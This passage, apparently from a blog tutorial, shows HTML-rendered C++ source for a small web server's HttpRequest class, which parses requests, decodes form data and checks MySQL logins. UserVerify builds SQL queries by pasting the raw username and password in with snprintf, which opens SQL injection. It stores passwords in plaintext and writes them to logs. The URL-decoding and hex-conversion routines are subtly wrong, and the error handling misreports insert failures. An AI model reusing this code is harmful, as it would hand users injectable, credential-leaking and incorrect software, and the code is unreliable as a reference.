class="type">bool</span> <span class="title">UserVerify</span><span class="params">(<span class="type">const</span> std::string&amp; name, <span class="type">const</span> std::string&amp; pwd, <span class="type">bool</span> isLogin)</span></span>;</span><br><span class="line"></span><br><span class="line">    PARSE_STATE state_;</span><br><span class="line">    std::string method_, path_, version_, body_;</span><br><span class="line">    std::unordered_map&lt;std::string, std::string&gt; header_;</span><br><span class="line">    std::unordered_map&lt;std::string, std::string&gt; post_;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> std::unordered_set&lt;std::string&gt; DeFALUT_HTML;</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> std::unordered_map&lt;std::string, <span class="type">int</span>&gt; DEFALUT_HTML_TAG;</span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">ConverHex</span><span class="params">(<span class="type">char</span> ch)</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><h3 id="HttpRequest-cpp"><a href="#HttpRequest-cpp" class="headerlink" title="HttpRequest.cpp"></a>HttpRequest.cpp</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;httprequest.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">HttpRequest::<span class="built_in">HttpRequest</span>() &#123; <span class="built_in">Init</span>(); &#125;</span><br><span class="line"></span><br><span class="line">HttpRequest::~<span class="built_in">HttpRequest</span>() = <span class="keyword">default</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HttpRequest::Init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  method_ = path_ = version_ = body_ = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  state_ = PARSE_STATE::REQUEST_LINE;</span><br><span class="line">  header_.<span class="built_in">clear</span>();</span><br><span class="line">  post_.<span class="built_in">clear</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">HttpRequest::parse</span><span class="params">(Buffer &amp;buff)</span> </span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> CRLF[] = <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (buff.<span class="built_in">ReadableBytes</span>() &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">while</span> (buff.<span class="built_in">ReadableBytes</span>() &amp;&amp; state_ != PARSE_STATE::FINISH) &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *lineEnd =</span><br><span class="line">        std::<span class="built_in">search</span>(buff.<span class="built_in">Peek</span>(), buff.<span class="built_in">BeginWriteConst</span>(), CRLF, CRLF + <span class="number">2</span>);</span><br><span class="line">    <span class="function">std::string <span class="title">line</span><span class="params">(buff.Peek(), lineEnd)</span></span>;</span><br><span class="line">    <span class="keyword">switch</span> (state_) &#123;</span><br><span class="line">    <span class="keyword">case</span> PARSE_STATE::REQUEST_LINE:</span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">ParesRequestLine_</span>(line))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      <span class="built_in">ParsePath_</span>();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> PARSE_STATE::HEADERS:</span><br><span class="line">      <span class="built_in">ParseHeader_</span>(line);</span><br><span class="line">      <span class="keyword">if</span> (buff.<span class="built_in">ReadableBytes</span>() &lt;= <span class="number">2</span>)</span><br><span class="line">        state_ = PARSE_STATE::FINISH;</span><br><span class="line">      <span class="comment">//若只有CRLF，则没有BODY</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> PARSE_STATE::BODY:</span><br><span class="line">      <span class="built_in">ParseBody_</span>(line);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (lineEnd == buff.<span class="built_in">BeginWriteConst</span>())</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    buff.<span class="built_in">RetrieveUntil</span>(lineEnd + <span class="number">2</span>); <span class="comment">//记得+2</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;[%s], [%s], [%s]&quot;</span>, method_.<span class="built_in">c_str</span>(), path_.<span class="built_in">c_str</span>(),</span><br><span class="line">            version_.<span class="built_in">c_str</span>());</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">std::string <span class="title">HttpRequest::path</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> path_; &#125;</span><br><span class="line"><span class="function">std::string &amp;<span class="title">HttpRequest::path</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> path_; &#125;</span><br><span class="line"><span class="function">std::string <span class="title">HttpRequest::method</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> method_; &#125;</span><br><span class="line"><span class="function">std::string <span class="title">HttpRequest::version</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> version_; &#125;</span><br><span class="line"><span class="function">std::string <span class="title">HttpRequest::GetPost</span><span class="params">(<span class="type">const</span> std::string &amp;key)</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">  <span class="built_in">assert</span>(key != <span class="string">&quot;&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (post_.<span class="built_in">count</span>(key) == <span class="number">1</span>) <span class="comment">//找的到</span></span><br><span class="line">    <span class="keyword">return</span> post_.<span class="built_in">find</span>(key)-&gt;second;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">std::string <span class="title">HttpRequest::GetPost</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *key)</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">  <span class="built_in">assert</span>(key != <span class="literal">nullptr</span>);</span><br><span class="line">  <span class="keyword">if</span> (post_.<span class="built_in">count</span>(key) == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> post_.<span class="built_in">find</span>(key)-&gt;second;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">HttpRequest::IsKeepAlive</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (header_.<span class="built_in">count</span>(<span class="string">&quot;Connection&quot;</span>) == <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> header_.<span class="built_in">find</span>(<span class="string">&quot;Connection&quot;</span>)-&gt;second == <span class="string">&quot;keep-alive&quot;</span> &amp;&amp;</span><br><span class="line">           version_ == <span class="string">&quot;1.1&quot;</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> TODO</span></span><br><span class="line"><span class="comment"> void HttpConn::ParseFormData() &#123;&#125;</span></span><br><span class="line"><span class="comment"> void HttpConn::ParseJson() &#123;&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">HttpRequest::ParesRequestLine_</span><span class="params">(<span class="type">const</span> std::string &amp;line)</span> </span>&#123;</span><br><span class="line">  <span class="function">std::regex <span class="title">patten</span><span class="params">(<span class="string">&quot;^([^ ]*) ([^ ]*) HTTP/([^ ]*)$&quot;</span>)</span></span>;</span><br><span class="line">  std::smatch subSmatch;</span><br><span class="line">  <span class="keyword">if</span> (std::<span class="built_in">regex_match</span>(line, subSmatch, patten)) &#123;</span><br><span class="line">    <span class="comment">//注意 subSmatch[0];表示匹配的整个字符串</span></span><br><span class="line">    method_ = subSmatch[<span class="number">1</span>];</span><br><span class="line">    path_ = subSmatch[<span class="number">2</span>];</span><br><span class="line">    version_ = subSmatch[<span class="number">3</span>];</span><br><span class="line">    state_ = PARSE_STATE::HEADERS;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;RequestLine Error&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HttpRequest::ParseHeader_</span><span class="params">(<span class="type">const</span> std::string &amp;line)</span> </span>&#123;</span><br><span class="line">  <span class="function">std::regex <span class="title">pattern</span><span class="params">(<span class="string">&quot;^([^:]*): ?(.*)$&quot;</span>)</span></span>;</span><br><span class="line">  std::smatch subSmatch;</span><br><span class="line">  <span class="keyword">if</span> (std::<span class="built_in">regex_match</span>(line, subSmatch, pattern)) &#123;</span><br><span class="line">    header_[subSmatch[<span class="number">1</span>]] = subSmatch[<span class="number">2</span>];</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    state_ = PARSE_STATE::BODY;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HttpRequest::ParseBody_</span><span class="params">(<span class="type">const</span> std::string &amp;line)</span> </span>&#123;</span><br><span class="line">  body_ = line;</span><br><span class="line">  <span class="built_in">ParsePost_</span>();</span><br><span class="line">  state_ = PARSE_STATE::FINISH;</span><br><span class="line">  <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;Body:%s, len:%d&quot;</span>, line.<span class="built_in">c_str</span>(), line.<span class="built_in">size</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HttpRequest::ParsePath_</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (path_ == <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">    path_ = <span class="string">&quot;/index.html&quot;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;item : DeFALUT_HTML) &#123;</span><br><span class="line">      <span class="keyword">if</span> (item == path_) &#123;</span><br><span class="line">        path_ += <span class="string">&quot;.html&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HttpRequest::ParsePost_</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (method_ == <span class="string">&quot;POST&quot;</span> &amp;&amp;</span><br><span class="line">      header_[<span class="string">&quot;Content-Type&quot;</span>] == <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>) &#123;</span><br><span class="line">    <span class="built_in">ParseFromUrlencoded_</span>();</span><br><span class="line">    <span class="keyword">if</span> (DEFALUT_HTML_TAG.<span class="built_in">count</span>(path_)) &#123;</span><br><span class="line">      <span class="type">int</span> tag = DEFALUT_HTML_TAG.<span class="built_in">find</span>(path_)-&gt;second;</span><br><span class="line">      <span class="keyword">if</span> (tag == <span class="number">0</span> || tag == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="type">bool</span> isLogin = (tag == <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">UserVerify</span>(post_[<span class="string">&quot;username&quot;</span>], post_[<span class="string">&quot;password&quot;</span>], isLogin)) &#123;</span><br><span class="line">          path_ = <span class="string">&quot;/welcome.html&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          path_ = <span class="string">&quot;/error.html&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//&amp;、=、+、%等，这些字符在URL编码中用于表示特殊意义</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HttpRequest::ParseFromUrlencoded_</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (body_.<span class="built_in">size</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  std::string key, value;</span><br><span class="line">  <span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> n = body_.<span class="built_in">size</span>();</span><br><span class="line">  <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; <span class="comment">//循环和unordered_map</span></span><br><span class="line">  <span class="keyword">for</span> (; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (body_[i]) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">      key = body_.<span class="built_in">substr</span>(j, i - j);</span><br><span class="line">      j = i + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">      body_[i] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;%&#x27;</span>:</span><br><span class="line">      num = <span class="built_in">ConverHex</span>(body_[i + <span class="number">1</span>]) * <span class="number">16</span> + <span class="built_in">ConverHex</span>(body_[i + <span class="number">2</span>]);</span><br><span class="line">      body_[i + <span class="number">1</span>] = num % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">      body_[i + <span class="number">2</span>] = num / <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">      i += <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;&amp;&#x27;</span>:</span><br><span class="line">      value = body_.<span class="built_in">substr</span>(j, i - j);</span><br><span class="line">      j = i + <span class="number">1</span>;</span><br><span class="line">      post_[key] = value;</span><br><span class="line">      <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;%s = %s&quot;</span>, key.<span class="built_in">c_str</span>(), value.<span class="built_in">c_str</span>());</span><br><span class="line">      <span class="built_in">LOG_DEBUG</span>(body_.<span class="built_in">c_str</span>());</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">assert</span>(j &lt; i);</span><br><span class="line">  <span class="comment">//处理最后一个键值对，因为最后不会有&amp;</span></span><br><span class="line">  <span class="keyword">if</span> (post_.<span class="built_in">count</span>(key) == <span class="number">0</span> &amp;&amp; j &lt; i) &#123;</span><br><span class="line">    value = body_.<span class="built_in">substr</span>(j, i - j);</span><br><span class="line">    post_[key] = value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">HttpRequest::UserVerify</span><span class="params">(<span class="type">const</span> std::string &amp;name, <span class="type">const</span> std::string &amp;pwd,</span></span></span><br><span class="line"><span class="params"><span class="function">                             <span class="type">bool</span> isLogin)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (name == <span class="string">&quot;&quot;</span> || pwd == <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="built_in">LOG_INFO</span>(<span class="string">&quot;Verify name:%s pwd:%s&quot;</span>, name.<span class="built_in">c_str</span>(), pwd.<span class="built_in">c_str</span>());</span><br><span class="line">  MYSQL *sql;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">SqlConnRAII</span>(&amp;sql, SqlConnPool::<span class="built_in">Instance</span>());</span><br><span class="line">  <span class="built_in">assert</span>(sql);</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">  <span class="type">size_t</span> j = <span class="number">0</span>;</span><br><span class="line">  <span class="type">char</span> order[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  MYSQL_FIELD *fileds = <span class="literal">nullptr</span>;</span><br><span class="line">  MYSQL_RES *res = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!isLogin) &#123;</span><br><span class="line">    flag = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">snprintf</span>(order, <span class="built_in">sizeof</span>(order),</span><br><span class="line">           <span class="string">&quot;select username, password from user WHERE username = &#x27;%s&#x27; LIMIT 1&quot;</span>,</span><br><span class="line">           name.<span class="built_in">c_str</span>());</span><br><span class="line">  <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;%s&quot;</span>, order);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">mysql_query</span>(sql, order)) <span class="comment">//非0成功</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">mysql_free_result</span>(res);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  res = <span class="built_in">mysql_store_result</span>(sql);</span><br><span class="line">  j = <span class="built_in">mysql_num_fields</span>(res);</span><br><span class="line">  fileds = <span class="built_in">mysql_fetch_fields</span>(res);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (MYSQL_ROW row = <span class="built_in">mysql_fetch_row</span>(res)) &#123; <span class="comment">//遍历</span></span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;MYSQL ROW: %s %s&quot;</span>, row[<span class="number">0</span>], row[<span class="number">1</span>]);</span><br><span class="line">    <span class="function">std::string <span class="title">password</span><span class="params">(row[<span class="number">1</span>])</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (isLogin) &#123;</span><br><span class="line">      <span class="keyword">if</span> (password == pwd) &#123;</span><br><span class="line">        flag = <span class="literal">true</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        flag = <span class="literal">false</span>;</span><br><span class="line">        <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;pwd error!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      flag = <span class="literal">false</span>;</span><br><span class="line">      <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;user used!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">mysql_free_result</span>(res);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!isLogin &amp;&amp; flag == <span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;regirster!&quot;</span>);</span><br><span class="line">    <span class="built_in">bzero</span>(order, <span class="number">256</span>);</span><br><span class="line">    <span class="built_in">snprintf</span>(order, <span class="number">256</span>,</span><br><span class="line">             <span class="string">&quot;INSERT INTO user(username, password) VALUES(&#x27;%s&#x27;,&#x27;%s&#x27;)&quot;</span>,</span><br><span class="line">             name.<span class="built_in">c_str</span>(), pwd.<span class="built_in">c_str</span>());</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;%s&quot;</span>, order);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">mysql_query</span>(sql, order)) &#123;</span><br><span class="line">      <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;Insert error!&quot;</span>);</span><br><span class="line">      flag = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    flag = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  SqlConnPool::<span class="built_in">Instance</span>()-&gt;<span class="built_in">FreeConn</span>(sql);</span><br><span class="line">  <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;UserVerify success!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> std::unordered_set&lt;std::string&gt; HttpRequest::DeFALUT_HTML&#123;</span><br><span class="line">    <span class="string">&quot;/index&quot;</span>, <span class="string">&quot;/register&quot;</span>, <span class="string">&quot;/login&quot;</span>, <span class="string">&quot;/welcome&quot;</span>, <span class="string">&quot;video&quot;</span>, <span class="string">&quot;/picture&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> std::unordered_map&lt;std::string, <span class="type">int</span>&gt; HttpRequest::DEFALUT_HTML_TAG&#123;</span><br><span class="line">    &#123;&#123;<span class="string">&quot;/register.html&quot;</span>, <span class="number">0</span>&#125;, &#123;<span class="string">&quot;/login.html&quot;</span>, <span class="number">1</span>&#125;&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">HttpRequest::ConverHex</span><span class="params">(<span class="type">char</span> ch)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (ch &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;F&#x27;</span>)</span><br><span class="line">    ch = ch - <span class="string">&#x27;A&#x27;</span> + <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">if</span> (ch &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;f&#x27;</span>)</span><br><span class="line">    ch = ch - <span class="string">&#x27;a&#x27;</span> + <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">return</span> ch;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="HttpResponse-h"><a href="#HttpResponse-h" class="headerlink" title="HttpResponse.h"></a>HttpResponse.h</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 